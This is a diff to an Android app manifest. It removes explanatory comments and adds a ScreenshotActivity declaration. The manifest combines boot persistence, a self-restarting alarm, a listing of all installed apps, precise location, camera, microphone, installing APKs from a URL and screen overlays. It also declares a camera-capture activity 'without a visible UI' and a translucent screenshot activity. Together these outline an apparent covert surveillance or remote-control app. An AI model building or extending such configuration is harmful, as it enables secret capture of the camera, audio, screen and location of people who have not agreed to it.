@@ -6,19 +6,12 @@
     <!-- ==              Core & Existing Permissions                  == -->
     <!-- =============================================================== -->
 
-    <!-- Required for network communication to Netlify and Firebase -->
     <uses-permission android:name="android.permission.INTERNET" />
-    <!-- Required on new Android versions to receive FCM messages -->
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS"/>
-    <!-- Required for the self-restarting alarm mechanism -->
     <uses-permission android:name="android.permission.USE_EXACT_ALARM" />
-    <!-- Required to wake the device screen -->
     <uses-permission android:name="android.permission.WAKE_LOCK" />
-    <!-- Required to listen for the device finishing its boot-up process -->
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
-    <!-- Required to see the list of all other apps installed on the device -->
     <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES" tools:ignore="QueryAllPackagesPermission" />
-    <!-- Required for getting precise GPS location -->
     <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
     <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
 
@@ -27,31 +20,21 @@
     <!-- ==              NEW PERMISSIONS FOR ADVANCED FEATURES        == -->
     <!-- =============================================================== -->
 
-    <!-- Required to access the device's camera for taking pictures. -->
     <uses-permission android:name="android.permission.CAMERA" />
-    <!-- Required to record audio from the microphone. -->
     <uses-permission android:name="android.permission.RECORD_AUDIO" />
-    <!-- Required to save audio recordings or other downloaded files.
-         Even with scoped storage, this is good practice for compatibility. -->
     <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" android:maxSdkVersion="28" />
-    <!-- Required to prompt the user to install an APK from a URL. -->
     <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />
-    <!-- (Optional but recommended) To draw an image overlay on the screen.
-         This is a sensitive permission that requires special user approval. -->
     <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
 
 
     <!-- =============================================================== -->
     <!-- ==                 Hardware Feature Declarations             == -->
     <!-- =============================================================== -->
-    <!-- Declaring features as 'required=false' ensures the app can be installed
-         on devices that might be missing certain hardware (e.g., a tablet with no GPS). -->
+
     <uses-feature android:name="android.hardware.location" android:required="false" />
     <uses-feature android:name="android.hardware.location.gps" android:required="false" />
-    <!-- NEW: Declare camera features -->
     <uses-feature android:name="android.hardware.camera" android:required="false" />
     <uses-feature android:name="android.hardware.camera.autofocus" android:required="false" />
-    <!-- Existing sensor features -->
     <uses-feature android:name="android.hardware.sensor.accelerometer" android:required="false" />
     <uses-feature android:name="android.hardware.sensor.gyroscope" android:required="false" />
     <uses-feature android:name="android.hardware.sensor.compass" android:required="false" />
@@ -78,22 +61,30 @@
         </activity>
 
         <!-- =============================================================== -->
-        <!-- ==        NEW ACTIVITY DECLARATIONS for Media Functions      == -->
+        <!-- ==        ALL ACTIVITY DECLARATIONS for Media Functions      == -->
         <!-- =============================================================== -->
 
-        <!-- NEW: A background activity to handle camera capture without a visible UI.
-             You will need to create the CameraActivity.java file. -->
+        <!-- A background activity to handle camera capture without a visible UI. -->
         <activity
             android:name=".CameraActivity"
             android:exported="false"
             android:theme="@android:style/Theme.Translucent.NoTitleBar" />
 
-        <!-- NEW: An activity to display an image received from a URL.
-             You will need to create the ImageDisplayActivity.java file. -->
+        <!-- An activity to display an image received from a URL. -->
         <activity
             android:name=".ImageDisplayActivity"
             android:exported="false"
             android:theme="@style/Theme.AppCompat.Dialog" />
+            
+        <!--
+           CRITICAL FIX: Added the missing declaration for ScreenshotActivity.
+           This tells the Android OS that this activity exists and can be started,
+           which will prevent the application from crashing.
+        -->
+        <activity
+            android:name=".ScreenshotActivity"
+            android:exported="false"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar" />
 
 
         <!-- =============================================================== -->
